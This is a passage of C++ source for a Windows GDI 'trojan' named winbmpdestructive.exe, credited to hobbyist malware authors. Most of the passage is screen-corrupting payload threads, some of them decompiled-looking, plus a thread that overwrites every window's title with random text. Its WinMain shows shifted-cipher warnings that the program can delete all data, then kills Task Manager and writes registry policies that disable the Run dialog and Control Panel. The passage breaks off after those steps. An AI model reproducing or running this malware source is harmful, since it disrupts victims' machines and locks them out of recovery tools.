        0, (w * h) * sizeof(_RGBQUAD),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    while (1) {
        HDC desk = GetDC(NULL);

        HDC memDC = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);

        SelectObject(memDC, hbm);

        for (int i = 0; i < w * h; i++) {
            int x = i % w;
            int y = i / w;
            BYTE val = (BYTE)((x | y >> t * (i * (x ^ (i * y)))) & 0xFF * (t * 100));
            data[i].r ^= val;
            data[i].g ^= val / 6;
            data[i].b ^= 655 - val;
        }

        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, memDC, 0, 0, SRCINVERT);

        DeleteObject(hbm);
        DeleteDC(memDC);
        ReleaseDC(NULL, desk);

        t++;
    }
    VirtualFree(data, 0, MEM_RELEASE);
}

//payload8

DWORD WINAPI gdi10(LPVOID lpParam)
{
    while (1)
    {
        SeedXorshift32(__rdtsc());
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        HDC desk = GetDC(0);
        gdi10_sab();
        gdi10_sab();
        gdi10_sab();
        FreeConsole();
    }
}

//payload9

DWORD WINAPI gdi11(LPVOID lpParam)
{
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    POINT wPt[3];
    RECT wRect;
    HDC desk = GetDC(0);
    double moveangle = 0;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    LPCSTR text = 0;
    while (1)
    {
        hdc = GetDC(0);
        desk = GetDC(0);
        SeedXorshift32(__rdtsc());
        BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left;
        wPt[0].y = wRect.top + 62.5;
        wPt[1].x = wRect.right - 62.5;
        wPt[1].y = wRect.top - 62.5;
        wPt[2].x = wRect.left + 125;
        wPt[2].y = wRect.bottom;
        PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        ReleaseDC(GetDesktopWindow(), desk);
        DeleteDC(desk);
    }
}

struct Point3D { float x, y, z; };
#define NUM_POINTS 600
#define SPHERE_RADIUS GetSystemMetrics(0)
#define PI 3.14159265359f

COLORREF GetRainbowColor(float h) {
    float r, g, b;
    h = fmodf(h, 1.0f);
    int i = (int)(h * 6);
    float f = h * 6 - i;
    float q = 1 - f;
    switch (i % 6) {
    case 0: r = 1, g = f, b = 0; break;
    case 1: r = q, g = 1, b = 0; break;
    case 2: r = 0, g = 1, b = f; break;
    case 3: r = 0, g = q, b = 1; break;
    case 4: r = f, g = 0, b = 1; break;
    case 5: r = 1, g = 0, b = q; break;
    }
    return RGB((int)(r * 255), (int)(g * 255), (int)(b * 255));
}

DWORD WINAPI mamap4(LPVOID lpParam) { // by Blueno
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);

    std::vector<Point3D> points;
    for (int i = 0; i < NUM_POINTS; i++) {
        float phi = acosf(-1.0f + (2.0f * i) / NUM_POINTS);
        float theta = sqrtf(NUM_POINTS * PI) * phi;
        points.push_back({ cosf(theta) * sinf(phi), sinf(theta) * sinf(phi), cosf(phi) });
    }

    float posX = (float)(rand() % (sw - 500) + 50);
    float posY = (float)(rand() % (sh - 500) + 50);
    float velX = 10.0f;
    float velY = 5.0f;

    float rotX = 0, rotY = 0, hue = 0;

    while (true) {
        HDC hdc = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, hbm);

        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

        posX += velX; posY += velY;
        if (posX - SPHERE_RADIUS <= 0 || posX + SPHERE_RADIUS >= sw) velX *= -1;
        if (posY - SPHERE_RADIUS <= 0 || posY + SPHERE_RADIUS >= sh) velY *= -1;

        rotX += 0.07f; rotY += 0.09f; hue += 0.009f;

        for (int i = 0; i < NUM_POINTS; i++) {
            float x = points[i].x * SPHERE_RADIUS;
            float y = points[i].y * SPHERE_RADIUS;
            float z = points[i].z * SPHERE_RADIUS;

            float ty = y * cos(rotX) - z * sin(rotX);
            float tz = y * sin(rotX) + z * cos(rotX);
            y = ty; z = tz;

            float tx = x * cos(rotY) + z * sin(rotY);
            tz = -x * sin(rotY) + z * cos(rotY);
            x = tx; z = tz;

            int screenX = (int)(x + posX);
            int screenY = (int)(y + posY);

            int pSize = (int)((z + SPHERE_RADIUS) / (SPHERE_RADIUS * 2) * 6) + 2;

            if (z > -SPHERE_RADIUS * 0.7) {
                HBRUSH brush = CreateSolidBrush(GetRainbowColor(hue + (float)i / NUM_POINTS));
                SelectObject(hdcMem, brush);

                Ellipse(hdcMem, screenX - pSize, screenY - pSize, screenX + pSize, screenY + pSize);

                DeleteObject(brush);
            }
        }

        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdc);

        Sleep(1);
    }
    return 0;

}

//payload10

DWORD WINAPI gdi12(LPVOID lpParam)
{
    uint uVar1;
    uint uVar2;
    int cy;
    HDC hdc;
    uint uVar3;
    uint uVar4;

    uVar2 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do {
        uVar1 = rdtsc();
        uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar3 = uVar3 ^ uVar3 << 0x11;
        uVar3 = (uVar3 << 5 ^ uVar3) % uVar2;
        uVar1 = rdtsc();
        uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
        uVar4 = uVar4 ^ uVar4 << 0x11;
        uVar4 = uVar4 ^ uVar4 << 5;
        BitBlt(hdc, uVar3, 0, 100, cy, hdc, uVar3,
            uVar4 + (((uint)((ulonglong)uVar4 * 0x124924925 >> 0x21) & 0xfffffff8) - uVar4 / 0xe) * -2 + -5, 0xee0086);
        Sleep(1);
    } while (true);
}

DWORD WINAPI gdi13(LPVOID lpParam)
{
    int sx = 0, sy = 0;
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    HPEN h;
    int right;
    uint uVar5;
    int top;
    int bottom;
    int left;
    int local_28;
    int local_1c;
    HBRUSH local_14;
    int local_10;
    uint local_c;
    uint local_8;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_c = (uVar5 << 5 ^ uVar5) % uVar4;
    local_14 = CreateSolidBrush(0xff);
    h = CreatePen(0, 2, 0xffffff);
    LPCWSTR lpText = L" AE";
    HFONT font = CreateFontA(rand() % 50, 50, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
    SelectObject(hdc, font);
    local_28 = 0;
    hdc = GetWindowDC(GetDesktopWindow());
    sx = GetSystemMetrics(0);
    sy = GetSystemMetrics(1);
    SetTextColor(hdc, Hue(3));
    SetBkColor(hdc, RGB(255, 0, 50));
    do
    {
        if (local_28 == 1) {
            local_14 = CreateSolidBrush(0xa5ff);
        }
        else if (local_28 == 2) {
            local_14 = CreateSolidBrush(0xffff);
        }
        else if (local_28 == 3) {
            local_14 = CreateSolidBrush(0xff00);
        }
        else if (local_28 == 4) {
            local_14 = CreateSolidBrush(0xffff00);
        }
        else if (local_28 == 5) {
            local_14 = CreateSolidBrush(0xff0000);
        }
        else if (local_28 == 6) {
            local_14 = CreateSolidBrush(0xd30094);
        }
        else if (local_28 == 7) {
            local_14 = CreateSolidBrush(0xff00ff);
        }
        else if (local_28 == 8) {
            local_14 = CreateSolidBrush(0xff);
            local_28 = 0;
        }
        SelectObject(hdc, local_14);
        SelectObject(hdc, h);
        if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) ||
            ((int)local_c < 1)) {
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_c = (uVar5 << 5 ^ uVar5) % uVar4;
        }
        uVar2 = rdtsc();
        left = local_8 - 0x3c;
        top = local_c - 0x3c;
        uVar5 = (uint)uVar2 & 3;
        right = local_8 + 0x3c;
        bottom = local_c + 0x3c;
        local_1c = 10;
        local_10 = right;
        do {
            if ((uVar2 & 3) == 0) {
                Rectangle(hdc, left, top, right, bottom);
                local_8 = local_8 + 0x14;
                left = left + 0x14;
                local_10 = local_10 + 0x14;
                bottom = bottom + 0x14;
                local_c = local_c + 0x14;
                top = top + 0x14;
            LAB_004020f7:
                TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
                Sleep(1);
                right = local_10;
            }
            else {
                if (uVar5 == 1) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 + 0x14;
                    local_10 = local_10 + 0x14;
                    left = left + 0x14;
                LAB_004020ed:
                    local_c = local_c - 0x14;
                    bottom = bottom + -0x14;
                    top = top + -0x14;
                    goto LAB_004020f7;
                    TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
                    Sleep(1);
                }
                if (uVar5 == 2) {
                    Rectangle(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    left = left + -0x14;
                    local_10 = local_10 + -0x14;
                    bottom = bottom + 0x14;
                    local_c = local_c + 0x14;
                    top = top + 0x14;
                    goto LAB_004020f7;
                    TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
                    Sleep(1);
                }
                if (uVar5 == 3) {
                    Rectangle(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    local_10 = local_10 + -0x14;
                    left = left + -0x14;
                    goto LAB_004020ed;
                    TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
                    Sleep(1);
                }
            }
            local_1c = local_1c + -1;
        } while (local_1c != 0);
        local_28 = local_28 + 1;
    } while (true);
}

//payload11

RECT wRect;
POINT wPt[3];
VOID gdi14_waterfall1(int counter)
{
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desktop = GetDC(NULL);
    upWnd = GetForegroundWindow();
    upHdc = GetDC(upWnd);
    desktop = GetDC(NULL);
    SeedXorshift32(__rdtsc());
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC deskMem = CreateCompatibleDC(desk);
    HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
    SelectObject(deskMem, screenshot);
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + counter;
    wPt[0].y = wRect.top - counter;
    wPt[1].x = wRect.right + counter;
    wPt[1].y = wRect.top + counter;
    wPt[2].x = wRect.left - counter;
    wPt[2].y = wRect.bottom - counter;
    PlgBlt(deskMem, wPt, upHdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    BitBlt(upHdc, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
    Sleep(10);
    if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
    Sleep(125);
}
VOID gdi14_waterfall2(int counter)
{
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desktop = GetDC(NULL);
    upWnd = GetForegroundWindow();
    upHdc = GetDC(upWnd);
    desktop = GetDC(NULL);
    SeedXorshift32(__rdtsc());
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    HDC deskMem = CreateCompatibleDC(desk);
    HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
    SelectObject(deskMem, screenshot);
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left - counter;
    wPt[0].y = wRect.top + counter;
    wPt[1].x = wRect.right - counter;
    wPt[1].y = wRect.top - counter;
    wPt[2].x = wRect.left + counter;
    wPt[2].y = wRect.bottom + counter;
    PlgBlt(deskMem, wPt, upHdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);;
    BitBlt(upHdc, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
    Sleep(10);
    if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
    Sleep(125);
}
DWORD WINAPI gdi14(LPVOID lpParam)
{
    while (1)
    {
        gdi14_waterfall1(10);
        gdi14_waterfall2(10);
        gdi14_waterfall2(10);
        gdi14_waterfall1(10);
    }
}

DWORD WINAPI gdi15(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    while (1)
    {
        hdc = GetDC(0);
        SelectObject(hdc, CreateSolidBrush(Hue(3)));
        BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
        BitBlt(hdc, x - 20, 0, x, y, hdc, 0, 0, PATCOPY);
        Sleep(5);
    }
}

//payload12

DWORD WINAPI gdi16(LPVOID lpParam)
{
    int uVar1;
    int uVar2;
    int uVar3;
    int uVar4;
    uint uVar5;
    uint uVar6;
    HDC hdc;
    uint uVar7;
    uint uVar8;

    uVar5 = GetSystemMetrics(0);
    uVar6 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    do
    {
        uVar1 = rdtsc();
        uVar2 = rdtsc();
        uVar3 = rdtsc();
        uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar7 = uVar7 ^ uVar7 << 0x11;
        uVar3 = rdtsc();
        uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
        uVar8 = uVar8 ^ uVar8 << 0x11;
        uVar3 = rdtsc();
        uVar4 = rdtsc();
        BitBlt(hdc, (uint)uVar4 & rand() % 5, (uint)uVar3 & rand() % 5, (uVar8 << 10 ^ uVar8) % uVar5, (uVar7 << 10 ^ uVar7) % uVar6, hdc, (uint)uVar2 & rand() % 5, (uint)uVar1 & rand() % 5, SRCCOPY);
    } while (true);
}

DWORD WINAPI gdi17(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    while (1) {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
        const int size = 3000;
        int x = xorshift32() % (w + size) - size / 2, y = xorshift32() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 600)
        {
            gdi17_sab(x - i / 2, y - i / 2, i, i);
        }
        RedrawWindow(0, 0, 0, 133);
        Sleep(10);
    }
}

DWORD WINAPI supermamap2(LPVOID lpParam)//credits to N17Pro3426's yesgntgfrf.exe
{
    HDC hdc;
    LPCWSTR text1 = L"winbmpdestructive.exe";
    LPCWSTR text2 = L"malware by Underwater Tiny Kong & VietNamLover";
    LPCWSTR text3 = L"Elias201478/x0rUnRe2xxide/x0anix will be eating poop.";
    LPCWSTR text4 = L"[ERROR: NAME HIJACKED] (ERROR: YEAR HACKED HACKED NULL)";

    while (true)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        SetBkColor(hdc, Hue(3));
        SetTextColor(hdc, RGB(rand() % 1000, rand() % 1000, rand() % 1000));
        TextOutW(hdc, 25, 25, text1, wcslen(text1));
        TextOutW(hdc, 25, 50, text2, wcslen(text2));
        TextOutW(hdc, 25, 75, text3, wcslen(text3));
        TextOutW(hdc, 25, 100, text4, wcslen(text4));
        ReleaseDC(0, hdc);
    }
}

void reg_add( //credits to Mist0090
    HKEY HKey,
    LPCWSTR Subkey,
    LPCWSTR ValueName,
    unsigned long Type,
    unsigned int Value
)
{
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;


    result = RegCreateKeyExW(
        HKey, //HKEY
        Subkey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition);

    result = RegSetValueExW(
        hKey,
        ValueName,
        0,
        Type,
        (const unsigned char*)&Value,
        (int)sizeof(Value)
    );

    RegCloseKey(hKey);
    return;
}

LPCWSTR generateRandomUnicodeString(int len) {
    wchar_t* ustr = new wchar_t[len + 1];  // +1 for '\0'
    for (int i = 0; i < len; i++) {
        ustr[i] = (rand() % 256) + 1024;
    }
    ustr[len] = L'\0';
    return ustr;
}
DWORD WINAPI TextProc(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    }
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 26 + 26), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    //WARNING

    if (MessageBoxW(NULL, L"Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz winbmpdestructive aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz? ", L"winbmpdestructive.exe (The new EternalRed.exe)", MB_ICONWARNING | MB_YESNO) != IDYES)
        return false;

    if (MessageBoxW(NULL, L"Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu.  Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong & VietNamLover) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu. ", L"winbmpdestructive.exe (The new EternalRed.exe)", MB_ICONWARNING | MB_YESNO) != IDYES)
        return false;
    //Default GDI

    CreateThread(0, 0, garbled, 0, 0, 0);
    CreateThread(0, 0, TextProc, 0, 0, 0);
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
